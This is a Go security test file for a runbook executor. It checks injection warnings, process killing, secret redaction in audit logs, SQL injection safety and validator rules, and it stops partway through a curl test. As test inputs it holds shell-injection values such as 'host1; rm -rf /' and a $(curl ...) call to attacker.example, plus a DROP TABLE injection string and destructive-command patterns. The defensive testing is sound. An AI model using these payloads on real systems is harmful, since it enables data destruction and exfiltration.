// Copyright 2026 runbook authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build !windows

// Security-focused test suite for the executor, resolver, audit, and validator
// subsystems. Each test is identified by a threat ID (T8–T29) matching the
// security design doc.
package executor

import (
	"bytes"
	"context"
	"database/sql"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	_ "github.com/mattn/go-sqlite3"

	"github.com/runbookdev/runbook/internal/ast"
	"github.com/runbookdev/runbook/internal/audit"
	"github.com/runbookdev/runbook/internal/resolver"
	"github.com/runbookdev/runbook/internal/validator"
)

// ── Resolver security tests (T8–T13) ─────────────────────────────────────

// simpleAST returns a minimal RunbookAST with one step referencing {{varname}}.
func simpleAST(varname string) *ast.RunbookAST {
	return &ast.RunbookAST{
		FilePath: "security-test.runbook",
		Metadata: ast.Metadata{Name: "security-test", Version: "1.0.0"},
		Steps: []ast.StepNode{
			{Name: "test-step", Command: "echo {{" + varname + "}}", Line: 1},
		},
	}
}

// silentNonInteractiveOpts returns resolver options that suppress output and
// skip interactive prompts.
func silentNonInteractiveOpts(w *bytes.Buffer) resolver.Options {
	return resolver.Options{
		NonInteractive: true,
		Stderr:         w,
	}
}

// TestT8_VariableInjection_Semicolon verifies that a variable value containing
// a semicolon — a shell command separator that enables arbitrary command
// injection — triggers a metacharacter warning. The warning is printed to
// stderr and, in non-strict mode, execution continues (operator is informed).
func TestT8_VariableInjection_Semicolon(t *testing.T) {
	rb := simpleAST("target_host")
	var warnBuf bytes.Buffer
	opts := silentNonInteractiveOpts(&warnBuf)

	injectionValue := "host1; rm -rf /"
	err := resolver.Resolve(rb, "", map[string]string{"target_host": injectionValue}, "", opts)
	if err != nil {
		t.Fatalf("expected no error in non-strict mode, got: %v", err)
	}
	out := warnBuf.String()
	if !strings.Contains(out, ";") || !strings.Contains(out, "WARNING") {
		t.Errorf("expected metacharacter ';' warning, got: %q", out)
	}
}

// TestT9_VariableInjection_CommandSubstitution verifies that $(...) in a
// resolved variable value triggers a warning. Command substitution allows
// an attacker to execute arbitrary commands via variable expansion.
func TestT9_VariableInjection_CommandSubstitution(t *testing.T) {
	rb := simpleAST("version")
	var warnBuf bytes.Buffer
	opts := silentNonInteractiveOpts(&warnBuf)

	injectionValue := "1.0.0$(curl http://attacker.example/exfil)"
	err := resolver.Resolve(rb, "", map[string]string{"version": injectionValue}, "", opts)
	if err != nil {
		t.Fatalf("expected no error in non-strict mode, got: %v", err)
	}
	out := warnBuf.String()
	if !strings.Contains(out, "$(") || !strings.Contains(out, "WARNING") {
		t.Errorf("expected metacharacter '$(' warning, got: %q", out)
	}
}

// TestT10_VariableInjection_Backtick verifies that a backtick in a resolved
// variable value triggers a warning. Backtick command substitution (`cmd`) is
// a legacy shell injection vector equivalent to $(...).
func TestT10_VariableInjection_Backtick(t *testing.T) {
	rb := simpleAST("service_name")
	var warnBuf bytes.Buffer
	opts := silentNonInteractiveOpts(&warnBuf)

	injectionValue := "app`id`"
	err := resolver.Resolve(rb, "", map[string]string{"service_name": injectionValue}, "", opts)
	if err != nil {
		t.Fatalf("expected no error in non-strict mode, got: %v", err)
	}
	out := warnBuf.String()
	if !strings.Contains(out, "`") || !strings.Contains(out, "WARNING") {
		t.Errorf("expected backtick metacharacter warning, got: %q", out)
	}
}

// TestT11_StrictMode_WarningsAreErrors verifies that --strict mode converts
// metacharacter warnings into hard errors, causing Resolve to return a
// *MetacharError. This prevents injection-risk variables from executing in
// unattended CI pipelines where an operator cannot review the warning.
func TestT11_StrictMode_WarningsAreErrors(t *testing.T) {
	rb := simpleAST("target")
	var warnBuf bytes.Buffer

	err := resolver.Resolve(rb, "", map[string]string{"target": "host; whoami"}, "", resolver.Options{
		Strict: true,
		Stderr: &warnBuf,
	})
	if err == nil {
		t.Fatal("expected MetacharError in strict mode, got nil")
	}

	var metaErr *resolver.MetacharError
	if !errors.As(err, &metaErr) {
		t.Errorf("expected *resolver.MetacharError, got %T: %v", err, err)
	}
	if len(metaErr.Warnings) == 0 {
		t.Error("expected at least one warning in MetacharError")
	}
	if metaErr.Warnings[0].Metachar == "" {
		t.Error("expected non-empty Metachar in warning")
	}
}

// TestT12_SecretNamedVariables_FlaggedForRedaction verifies that variables
// whose names contain secret-pattern keywords (PASSWORD, TOKEN, KEY, etc.)
// are automatically tracked in ResolvedSecrets for downstream audit redaction.
// Without this, secret values would appear in plain text in the audit DB.
func TestT12_SecretNamedVariables_FlaggedForRedaction(t *testing.T) {
	rb := simpleAST("db_password")
	var warnBuf bytes.Buffer

	secretVal := "super-secret-password-value"
	err := resolver.Resolve(rb, "", map[string]string{"db_password": secretVal}, "", resolver.Options{
		NonInteractive: true,
		Stderr:         &warnBuf,
	})
	if err != nil {
		t.Fatalf("resolve failed: %v", err)
	}

	if rb.ResolvedSecrets == nil {
		t.Fatal("ResolvedSecrets is nil after Resolve")
	}
	if val, ok := rb.ResolvedSecrets["db_password"]; !ok {
		t.Error("expected 'db_password' to be tracked as a secret")
	} else if val != secretVal {
		t.Errorf("expected secret value %q, got %q", secretVal, val)
	}

	// Verify other secret-pattern names are also caught.
	rb2 := simpleAST("api_token")
	tokenVal := "ghp_abcdefghijklmn"
	_ = resolver.Resolve(rb2, "", map[string]string{"api_token": tokenVal}, "", resolver.Options{
		NonInteractive: true,
		Stderr:         &warnBuf,
	})
	if _, ok := rb2.ResolvedSecrets["api_token"]; !ok {
		t.Error("expected 'api_token' (contains TOKEN) to be tracked as a secret")
	}
}

// TestT13_ResolutionPriority verifies the strict priority order:
// CLI flags > RUNBOOK_* env vars > .env file > built-in variables.
// Incorrect priority could allow a lower-trust source to override operator-
// supplied values, enabling privilege escalation or configuration injection.
func TestT13_ResolutionPriority(t *testing.T) {
	dir := t.TempDir()
	envFile := filepath.Join(dir, ".env")
	if err := os.WriteFile(envFile, []byte("myvar=dotenv-value\n"), 0o600); err != nil {
		t.Fatalf("creating .env file: %v", err)
	}

	// Set RUNBOOK_MYVAR in the process environment.
	t.Setenv("RUNBOOK_MYVAR", "env-value")

	nonInteractive := resolver.Options{NonInteractive: true, Stderr: &bytes.Buffer{}}

	// --- Test 1: CLI wins over everything ---
	rb := simpleAST("myvar")
	if err := resolver.Resolve(rb, "", map[string]string{"myvar": "cli-value"}, envFile, nonInteractive); err != nil {
		t.Fatalf("resolve failed: %v", err)
	}
	if got := rb.Steps[0].Command; got != "echo cli-value" {
		t.Errorf("CLI priority: expected 'echo cli-value', got %q", got)
	}

	// --- Test 2: RUNBOOK_* env wins over .env (no CLI var) ---
	rb2 := simpleAST("myvar")
	if err := resolver.Resolve(rb2, "", nil, envFile, nonInteractive); err != nil {
		t.Fatalf("resolve failed: %v", err)
	}
	if got := rb2.Steps[0].Command; got != "echo env-value" {
		t.Errorf("env priority: expected 'echo env-value', got %q", got)
	}

	// --- Test 3: .env wins over builtins (no CLI, no RUNBOOK_ env for this var) ---
	rb3 := simpleAST("other_var")
	altEnvFile := filepath.Join(dir, "alt.env")
	if err := os.WriteFile(altEnvFile, []byte("other_var=dotenv-only\n"), 0o600); err != nil {
		t.Fatalf("creating alt .env: %v", err)
	}
	if err := resolver.Resolve(rb3, "", nil, altEnvFile, nonInteractive); err != nil {
		t.Fatalf("resolve failed: %v", err)
	}
	if got := rb3.Steps[0].Command; got != "echo dotenv-only" {
		t.Errorf(".env priority: expected 'echo dotenv-only', got %q", got)
	}
}

// ── Executor security tests (T14–T19) ────────────────────────────────────

// TestT14_TimeoutKillsProcessGroup verifies that when a step times out, the
// entire process group (parent + spawned children) is killed — not just the
// immediate subprocess. Killing only the parent would leave orphaned child
// processes consuming resources and potentially holding open file handles.
func TestT14_TimeoutKillsProcessGroup(t *testing.T) {
	dir := t.TempDir()
	pidFile := filepath.Join(dir, "child.pid")

	exec, _, _ := newTestExecutor(t)
	ctx := context.Background()

	// Start a background child subprocess that writes its PID to a file,
	// then sleeps. The outer shell also sleeps. If group-kill works, both die.
	cmd := fmt.Sprintf(`sh -c 'echo $$ > %s; sleep 100' &
sleep 100`, pidFile)

	result, err := exec.Run(ctx, "t14-group-kill", cmd, 400*time.Millisecond, 150*time.Millisecond)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Status != StatusTimeout {
		t.Errorf("expected StatusTimeout, got %s", result.Status)
	}

	// Allow a moment for child processes to be reaped.
	time.Sleep(200 * time.Millisecond)

	// If the PID file was written, verify the child process is gone.
	pidData, err := os.ReadFile(pidFile)
	if err != nil {
		// PID file not written — child was killed before it could write.
		t.Logf("child PID file not found (child killed before writing) — group kill effective")
		return
	}

	var childPID int
	if _, err := fmt.Sscanf(strings.TrimSpace(string(pidData)), "%d", &childPID); err != nil || childPID <= 0 {
		t.Logf("could not parse child PID from %q", string(pidData))
		return
	}

	// kill -0 returns an error if the process no longer exists.
	if err := syscall.Kill(childPID, 0); err == nil {
		t.Errorf("child process %d still running after group kill — process group was not killed", childPID)
	}
}

// TestT15_SIGKILLAfterGracePeriod verifies that a process which ignores
// SIGTERM is killed unconditionally by SIGKILL after the grace period expires.
// Without SIGKILL escalation, a malicious or buggy command could block
// runbook termination indefinitely.
func TestT15_SIGKILLAfterGracePeriod(t *testing.T) {
	exec, _, _ := newTestExecutor(t)
	ctx := context.Background()

	// The process traps SIGTERM (making it unkillable by soft signal) and
	// sleeps for 100 seconds. With a 50ms grace period, SIGKILL must fire.
	start := time.Now()
	result, err := exec.Run(ctx, "t15-unkillable",
		"trap '' SIGTERM; sleep 100",
		150*time.Millisecond, // per-step timeout
		50*time.Millisecond,  // grace period before SIGKILL
	)
	elapsed := time.Since(start)

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Status != StatusTimeout {
		t.Errorf("expected StatusTimeout (killed by SIGKILL), got %s", result.Status)
	}

	// Total time should be timeout + grace + small overhead (<2s).
	// If SIGKILL did not fire, the test would run for ~100s.
	if elapsed > 3*time.Second {
		t.Errorf("Run took %s — SIGKILL may not have fired (grace=%s)", elapsed, 50*time.Millisecond)
	}
}

// TestT16_TempFilesHave0600Perms verifies that the temporary shell script
// written by the executor is created with mode 0600 (owner read/write only).
// World-readable temp scripts would expose the command and any embedded
// secrets to other users on a shared system.
func TestT16_TempFilesHave0600Perms(t *testing.T) {
	dir := t.TempDir()
	var stdout, stderr bytes.Buffer
	exec := &StepExecutor{
		Shell:   "/bin/sh",
		WorkDir: t.TempDir(),
		TempDir: dir,
		Stdout:  &stdout,
		Stderr:  &stderr,
	}

	type result struct {
		found bool
		perm  os.FileMode
		name  string
	}
	ch := make(chan result, 1)

	// Poll the TempDir while the step is running.
	go func() {
		deadline := time.Now().Add(10 * time.Second)
		for time.Now().Before(deadline) {
			entries, _ := os.ReadDir(dir)
			for _, e := range entries {
				if strings.HasSuffix(e.Name(), ".sh") {
					info, err := e.Info()
					if err == nil {
						ch <- result{found: true, perm: info.Mode().Perm(), name: e.Name()}
						return
					}
				}
			}
			time.Sleep(time.Millisecond)
		}
		ch <- result{found: false}
	}()

	// Run a command that sleeps long enough for the goroutine to observe the file.
	exec.Run(context.Background(), "t16-perms", "sleep 0.5", 5*time.Second, 0)

	select {
	case res := <-ch:
		if !res.found {
			t.Fatal("temp script file was not observed in TempDir during execution")
		}
		if res.perm != 0o600 {
			t.Errorf("temp script %s permissions: got %04o, want 0600", res.name, res.perm)
		}
	case <-time.After(6 * time.Second):
		t.Fatal("timed out waiting to observe temp script file")
	}
}

// TestT17_TempFilesCleanedAfterTimeoutKill verifies that the executor's
// deferred cleanup removes the temporary shell script even when the subprocess
// is killed by timeout. Leftover temp files could accumulate over many
// executions, leak command content, or fill disk space.
func TestT17_TempFilesCleanedAfterTimeoutKill(t *testing.T) {
	dir := t.TempDir()
	var stdout, stderr bytes.Buffer
	exec := &StepExecutor{
		Shell:   "/bin/sh",
		WorkDir: t.TempDir(),
		TempDir: dir,
		Stdout:  &stdout,
		Stderr:  &stderr,
	}

	// Run a long command that will be killed by the short timeout.
	result, err := exec.Run(context.Background(), "t17-cleanup",
		"sleep 100",
		150*time.Millisecond,
		50*time.Millisecond,
	)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Status != StatusTimeout {
		t.Errorf("expected StatusTimeout, got %s", result.Status)
	}

	// After Run returns, all deferred cleanup has run — no .sh files should remain.
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("reading TempDir: %v", err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".sh") {
			t.Errorf("temp script file %q not cleaned up after timeout kill", e.Name())
		}
	}
}

// TestT18_RootUserWarning verifies that the executor does not emit spurious
// "running as root" warnings for non-root users. When running as root, the
// test documents the expected behaviour without asserting implementation details
// (the warning feature is advisory and non-fatal).
func TestT18_RootUserWarning(t *testing.T) {
	exec, _, stderr := newTestExecutor(t)
	exec.Run(context.Background(), "t18-root-check", "echo hello", 0, 0)

	if os.Getuid() != 0 {
		// Non-root path: verify no false-positive root warning is emitted.
		if strings.Contains(stderr.String(), "running as root") {
			t.Errorf("unexpected 'running as root' warning for non-root user (uid=%d)", os.Getuid())
		}
		return
	}

	// Root path: root warning (if implemented) is informational.
	t.Logf("running as root (uid=0); root-warning feature is advisory")
}

// TestT19_StdinClosedNonInteractive verifies that when the StepExecutor's
// Stdin field is nil (non-interactive mode), the subprocess reads from
// /dev/null and does not block waiting for terminal input. A subprocess that
// reads from an inherited stdin could hang indefinitely in CI environments.
func TestT19_StdinClosedNonInteractive(t *testing.T) {
	var stdout, stderr bytes.Buffer
	exec := &StepExecutor{
		Shell:   "/bin/sh",
		WorkDir: t.TempDir(),
		Stdout:  &stdout,
		Stderr:  &stderr,
		Stdin:   nil, // nil → subprocess gets /dev/null
	}

	// `read` returns immediately on EOF (which /dev/null delivers at once).
	// If stdin were inherited from the terminal, this would block indefinitely.
	result, err := exec.Run(context.Background(), "t19-stdin",
		"read -r line; echo \"stdin-line:$line\"; echo exit-ok",
		3*time.Second, 0)

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Status != StatusSuccess {
		t.Errorf("expected success (stdin EOF should not cause failure), got %s\nstderr: %s",
			result.Status, result.Stderr)
	}
	// `echo exit-ok` should have run, confirming stdin did not block.
	if !strings.Contains(stdout.String(), "exit-ok") {
		t.Errorf("expected 'exit-ok' in output (stdin should not block), got: %q", stdout.String())
	}
}

// ── Audit security tests (T20–T24) ───────────────────────────────────────

// openTestAuditDB creates a temporary audit database and returns an open Logger.
func openTestAuditDB(t *testing.T) (*audit.Logger, string) {
	t.Helper()
	dir := t.TempDir()
	dbPath := filepath.Join(dir, "audit.db")
	al, err := audit.Open(dbPath)
	if err != nil {
		t.Fatalf("opening audit DB: %v", err)
	}
	t.Cleanup(func() { _ = al.Close() })
	return al, dbPath
}

// TestT20_SecretValuesNeverInAuditDB verifies that secret values do not appear
// in any queried column of the audit database. Secrets must be replaced with
// [REDACTED] before persistence to prevent audit log exfiltration attacks.
func TestT20_SecretValuesNeverInAuditDB(t *testing.T) {
	al, _ := openTestAuditDB(t)

	const secretVal = "SUPER_SECRET_API_KEY_T20_CANARY"
	runID := "t20-secret-test-run"

	// Start a run that contains the secret as a variable value.
	err := al.StartRun(audit.RunRecord{
		ID:          runID,
		Runbook:     "security-test.runbook",
		Name:        "Secret Test",
		Version:     "1.0.0",
		Environment: "production",
		StartedAt:   time.Now(),
		User:        "operator",
		Hostname:    "test-host",
		Variables: map[string]string{
			"api_key":     secretVal, // "KEY" pattern → sensitive
			"environment": "production",
		},
	})
	if err != nil {
		t.Fatalf("StartRun: %v", err)
	}

	// Log a step where the secret appears in stdout, stderr, and command.
	secrets := map[string]string{"api_key": secretVal}
	err = al.LogStep(audit.StepLog{
		RunID:      runID,
		StepName:   "deploy",
		BlockType:  "step",
		StartedAt:  time.Now(),
		FinishedAt: time.Now(),
		ExitCode:   0,
		Status:     "success",
		Stdout:     "Deploying with key: " + secretVal,
		Stderr:     "Warning: key " + secretVal + " will expire",
		Command:    "deploy --api-key=" + secretVal,
		Secrets:    secrets,
	})
	if err != nil {
		t.Fatalf("LogStep: %v", err)
	}

	_ = al.EndRun(runID, "success", time.Now())

	// Query back and verify no column contains the raw secret value.
	run, steps, err := al.GetRun(runID)
	if err != nil {
		t.Fatalf("GetRun: %v", err)
	}

	// Check run variable values.
	for k, v := range run.Variables {
		if strings.Contains(v, secretVal) {
			t.Errorf("secret found in run variable %q = %q", k, v)
		}
	}

	// Check all step fields.
	if len(steps) == 0 {
		t.Fatal("expected at least one step log")
	}
	for _, s := range steps {
		for field, val := range map[string]string{
			"stdout":  s.Stdout,
			"stderr":  s.Stderr,
			"command": s.Command,
		} {
			if strings.Contains(val, secretVal) {
				t.Errorf("secret canary %q found in step field %q: %q", secretVal, field, val)
			}
		}
	}
}

// TestT21_SQLInjectionSafelyHandled verifies that SQL injection strings
// passed as run or step metadata are stored verbatim as data — never executed
// as SQL. The audit package uses parameterized queries to prevent injection.
func TestT21_SQLInjectionSafelyHandled(t *testing.T) {
	al, dbPath := openTestAuditDB(t)

	// Classic SQL injection string intended to drop the step_logs table.
	injection := "'; DROP TABLE step_logs; --"
	runID := "t21-injection-' OR '1'='1"

	// These must not cause SQL errors or modify the schema.
	err := al.StartRun(audit.RunRecord{
		ID:          runID,
		Runbook:     injection,
		Name:        injection,
		Version:     injection,
		Environment: injection,
		StartedAt:   time.Now(),
	})
	if err != nil {
		t.Fatalf("StartRun with injection string failed: %v", err)
	}

	err = al.LogStep(audit.StepLog{
		RunID:      runID,
		StepName:   injection,
		BlockType:  "step",
		StartedAt:  time.Now(),
		FinishedAt: time.Now(),
		Status:     "success",
		Command:    injection,
		Stdout:     injection,
		Stderr:     injection,
	})
	if err != nil {
		t.Fatalf("LogStep with injection string failed: %v", err)
	}

	_ = al.EndRun(runID, "success", time.Now())

	// Verify the tables still exist and the data is stored as-is.
	_ = al.Close()

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		t.Fatalf("re-opening DB: %v", err)
	}
	defer db.Close()

	// step_logs table must still exist and be queryable.
	var count int
	err = db.QueryRow(`SELECT COUNT(*) FROM step_logs WHERE run_id = ?`, runID).Scan(&count)
	if err != nil {
		t.Fatalf("step_logs table missing or query failed — possible SQL injection: %v", err)
	}
	if count == 0 {
		t.Error("expected at least one step log for the injection run")
	}

	// runs table must still exist.
	var runCount int
	err = db.QueryRow(`SELECT COUNT(*) FROM runs WHERE id = ?`, runID).Scan(&runCount)
	if err != nil {
		t.Fatalf("runs table missing or query failed: %v", err)
	}
	if runCount == 0 {
		t.Error("expected run record for the injection run")
	}
}

// TestT22_AuditDBFilePermissions verifies that newly created audit databases
// are automatically set to mode 0600 (owner read/write only). A world-readable
// audit DB would expose execution history, variables, and commands to all
// local users — including any secrets that escaped redaction.
func TestT22_AuditDBFilePermissions(t *testing.T) {
	dir := t.TempDir()
	dbPath := filepath.Join(dir, "perms-check.db")

	al, err := audit.Open(dbPath)
	if err != nil {
		t.Fatalf("opening audit DB: %v", err)
	}
	_ = al.Close()

	info, err := os.Stat(dbPath)
	if err != nil {
		t.Fatalf("stat audit DB: %v", err)
	}
	perm := info.Mode().Perm()
	if perm != 0o600 {
		t.Errorf("audit DB permissions: got %04o, want 0600", perm)
	}
}

// TestT23_RunIDsUseCryptoRand verifies that run IDs are generated with
// crypto/rand and satisfy uniqueness and format requirements. Predictable run
// IDs (e.g., sequential integers) could allow an attacker to enumerate audit
// records or forge run associations.
func TestT23_RunIDsUseCryptoRand(t *testing.T) {
	const n = 1000
	seen := make(map[string]bool, n)

	for i := range n {
		id := newRunID()

		// Format: "run_" + 8 lowercase hex characters.
		if !strings.HasPrefix(id, "run_") {
			t.Errorf("[%d] run ID %q missing 'run_' prefix", i, id)
			continue
		}
		hexPart := strings.TrimPrefix(id, "run_")
		if len(hexPart) != 8 {
			t.Errorf("[%d] run ID %q hex part length: got %d, want 8", i, id, len(hexPart))
		}
		for _, c := range hexPart {
			if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
				t.Errorf("[%d] run ID %q contains non-hex char %q", i, id, c)
				break
			}
		}

		// Uniqueness: no duplicates across 1000 generations.
		if seen[id] {
			t.Errorf("duplicate run ID %q generated at iteration %d", id, i)
		}
		seen[id] = true
	}
}

// TestT24_OutputTruncatedAt1MB verifies that stdout/stderr exceeding 1 MB are
// truncated before being stored in the audit database, and that the truncation
// marker is appended. Unlimited output storage could be used to exhaust disk
// space or degrade audit DB performance with a single long-running step.
func TestT24_OutputTruncatedAt1MB(t *testing.T) {
	al, _ := openTestAuditDB(t)
	runID := "t24-truncation-test"

	err := al.StartRun(audit.RunRecord{
		ID: runID, Runbook: "test.runbook", Name: "Truncation Test",
		Version: "1.0.0", StartedAt: time.Now(),
	})
	if err != nil {
		t.Fatalf("StartRun: %v", err)
	}

	// Create stdout output just over the 1 MB limit.
	oversized := strings.Repeat("A", (1<<20)+512)

	err = al.LogStep(audit.StepLog{
		RunID:      runID,
		StepName:   "big-output",
		BlockType:  "step",
		StartedAt:  time.Now(),
		FinishedAt: time.Now(),
		Status:     "success",
		Stdout:     oversized,
		Stderr:     oversized,
	})
	if err != nil {
		t.Fatalf("LogStep: %v", err)
	}

	_ = al.EndRun(runID, "success", time.Now())

	_, steps, err := al.GetRun(runID)
	if err != nil {
		t.Fatalf("GetRun: %v", err)
	}
	if len(steps) == 0 {
		t.Fatal("expected at least one step log")
	}

	s := steps[0]
	const marker = "[OUTPUT TRUNCATED AT 1 MB]"

	if !strings.Contains(s.Stdout, marker) {
		t.Errorf("expected truncation marker in stdout; len(stdout)=%d", len(s.Stdout))
	}
	if !strings.Contains(s.Stderr, marker) {
		t.Errorf("expected truncation marker in stderr; len(stderr)=%d", len(s.Stderr))
	}

	// After truncation + marker, the stored value should be capped.
	maxStored := (1 << 20) + len(marker)
	if len(s.Stdout) > maxStored {
		t.Errorf("stored stdout length %d exceeds cap of %d bytes", len(s.Stdout), maxStored)
	}
}

// ── Validator security tests (T25–T29) ───────────────────────────────────

// makeAST builds a minimal RunbookAST with the given steps for validator testing.
func makeAST(steps ...ast.StepNode) *ast.RunbookAST {
	return &ast.RunbookAST{
		FilePath: "security-validator-test.runbook",
		Metadata: ast.Metadata{Name: "security-test", Version: "1.0.0"},
		Steps:    steps,
	}
}

// hasWarningContaining checks whether any ValidationError with Warning severity
// has a message containing the given substring.
func hasWarningContaining(errs []validator.ValidationError, sub string) bool {
	for _, e := range errs {
		if e.Severity == validator.Warning && strings.Contains(e.Message, sub) {
			return true
		}
	}
	return false
}

// hasErrorContaining checks whether any ValidationError with Error severity
// has a message containing the given substring.
func hasErrorContaining(errs []validator.ValidationError, sub string) bool {
	for _, e := range errs {
		if e.Severity == validator.Error && strings.Contains(e.Message, sub) {
			return true
		}
	}
	return false
}

// TestT25_ProductionWithoutConfirmGateWarning verifies that a step targeting
// the production environment without a confirmation gate produces a security
// warning. This guard prevents accidental execution of production-affecting
// commands without explicit operator acknowledgment.
func TestT25_ProductionWithoutConfirmGateWarning(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:    "deploy-prod",
		Command: "kubectl apply -f prod.yaml",
		Env:     []string{"production"},
		Line:    10,
		// Confirm field intentionally omitted.
	})

	errs := validator.Validate(rb, validator.Options{})
	if !hasWarningContaining(errs, "production") {
		t.Errorf("expected production-without-confirm warning, got: %v", errs)
	}
}

// TestT25_WithConfirmGateNoWarning verifies the absence of a false positive:
// a production step WITH a confirmation gate should not trigger the warning.
func TestT25_WithConfirmGateNoWarning(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:    "deploy-prod",
		Command: "kubectl apply -f prod.yaml",
		Env:     []string{"production"},
		Confirm: "production",
		Line:    10,
	})

	errs := validator.Validate(rb, validator.Options{})
	if hasWarningContaining(errs, "production") && hasWarningContaining(errs, "confirmation gate") {
		t.Errorf("unexpected production-without-confirm warning when confirm gate is present: %v", errs)
	}
}

// TestT25_SecurityStrict_PromotesToError verifies that --security-strict mode
// promotes the production-without-confirm advisory from a warning to a hard
// error, blocking CI pipelines from merging unchecked production steps.
func TestT25_SecurityStrict_PromotesToError(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:    "risky-prod",
		Command: "kubectl apply -f prod.yaml",
		Env:     []string{"production"},
		Line:    10,
	})

	errs := validator.Validate(rb, validator.Options{SecurityStrict: true})
	if !hasErrorContaining(errs, "production") {
		t.Errorf("expected production-without-confirm to be promoted to error in strict mode, got: %v", errs)
	}
}

// TestT26_DestructiveCommandWithoutRollbackWarning verifies that a step
// containing a destructive command pattern (rm -rf, DROP TABLE, etc.) without
// a rollback handler produces a security warning. Without a rollback, an
// accidental destructive operation cannot be undone.
func TestT26_DestructiveCommandWithoutRollbackWarning(t *testing.T) {
	cases := []struct {
		name    string
		command string
		pattern string
	}{
		{"rm-rf", "rm -rf /tmp/data", "rm -rf"},
		{"drop-table", "psql -c 'DROP TABLE users'", "DROP TABLE"},
		{"delete-from", "mysql -e 'DELETE FROM logs WHERE age > 30'", "DELETE FROM"},
		{"kubectl-delete", "kubectl delete deployment app", "kubectl delete"},
		{"docker-rm", "docker rm -f mycontainer", "docker rm"},
		{"terraform-destroy", "terraform destroy -auto-approve", "terraform destroy"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rb := makeAST(ast.StepNode{
				Name:    "destructive",
				Command: tc.command,
				Line:    5,
				// No Rollback field.
			})

			errs := validator.Validate(rb, validator.Options{})
			if !hasWarningContaining(errs, tc.pattern) {
				t.Errorf("expected destructive-without-rollback warning for %q, got: %v", tc.pattern, errs)
			}
		})
	}
}

// TestT26_WithRollbackNoWarning verifies that a destructive command with a
// rollback handler does not trigger the warning.
func TestT26_WithRollbackNoWarning(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:     "safe-delete",
		Command:  "rm -rf /tmp/old-data",
		Rollback: "restore-data",
		Line:     5,
	})
	rb.Rollbacks = []ast.RollbackNode{
		{Name: "restore-data", Command: "restore /tmp/old-data", Line: 10},
	}

	errs := validator.Validate(rb, validator.Options{})
	if hasWarningContaining(errs, "rollback") && hasWarningContaining(errs, "rm -rf") {
		t.Errorf("unexpected destructive-without-rollback warning when rollback is present: %v", errs)
	}
}

// TestT27_HardcodedSecretTriggersError verifies that commands containing
// apparent hardcoded credentials — keyword assignments, AWS key patterns, or
// long hex strings — are flagged. Hardcoded secrets checked into runbooks
// expose credentials to anyone with repository access.
func TestT27_HardcodedSecretTriggersError(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{
			// credAssignRe: keyword=literal (not a template/shell var)
			name:    "password-assignment",
			command: "export PASSWORD=MySuperSecretValue123",
		},
		{
			// credAssignRe: TOKEN= assignment
			name:    "token-assignment",
			command: "TOKEN=ghp_realSecretTokenValue123 deploy.sh",
		},
		{
			// awsKeyRe: AKIA + exactly 16 uppercase alphanumeric chars
			name:    "aws-key",
			command: "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws s3 ls",
		},
		{
			// longHexRe: standalone hex string longer than 32 chars
			name:    "long-hex-string",
			command: "export SECRET=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 deploy.sh",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rb := makeAST(ast.StepNode{
				Name:    "secret-step",
				Command: tc.command,
				Line:    1,
			})

			// Default mode: warning.
			errs := validator.Validate(rb, validator.Options{})
			if !hasWarningContaining(errs, "hardcoded") {
				t.Errorf("expected hardcoded-secret warning for %q, got: %v", tc.name, errs)
			}

			// Strict mode: promoted to error.
			strictErrs := validator.Validate(rb, validator.Options{SecurityStrict: true})
			if !hasErrorContaining(strictErrs, "hardcoded") {
				t.Errorf("expected hardcoded-secret error in strict mode for %q, got: %v", tc.name, strictErrs)
			}
		})
	}
}

// TestT27_TemplateVarNotFlagged verifies that a command using a template
// variable ({{password}}) for a credential is NOT flagged as a hardcoded
// secret — template vars are the approved pattern.
func TestT27_TemplateVarNotFlagged(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:    "safe-auth",
		Command: "mysql -u root -p{{db_password}}",
		Line:    1,
	})

	errs := validator.Validate(rb, validator.Options{})
	if hasWarningContaining(errs, "hardcoded") {
		t.Errorf("template variable should not be flagged as hardcoded secret: %v", errs)
	}
}

// TestT28_CurlInsecureWarning verifies that curl invocations with -k or
// --insecure are flagged. These flags disable TLS certificate validation,
// enabling man-in-the-middle attacks against HTTPS endpoints.
func TestT28_CurlInsecureWarning(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"short-flag", "curl -k https://api.example.com/data"},
		{"long-flag", "curl --insecure https://api.example.com/data"},
		{"with-other-flags", "curl -s -k -o output.json https://api.example.com"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rb := makeAST(ast.StepNode{
				Name:    "insecure-curl",
				Command: tc.command,
				Line:    1,
			})

			errs := validator.Validate(rb, validator.Options{})
			if !hasWarningContaining(errs, "TLS verification disabled") {
				t.Errorf("expected curl-insecure warning for %q, got: %v", tc.command, errs)
			}
		})
	}
}

// TestT28_SecureCurlNotFlagged verifies that secure curl usage (https without
// -k) does not produce a false-positive warning.
func TestT28_SecureCurlNotFlagged(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:    "secure-curl",
		Command: "curl -s https://api.example.com/data -o result.json",
		Line:    1,
	})

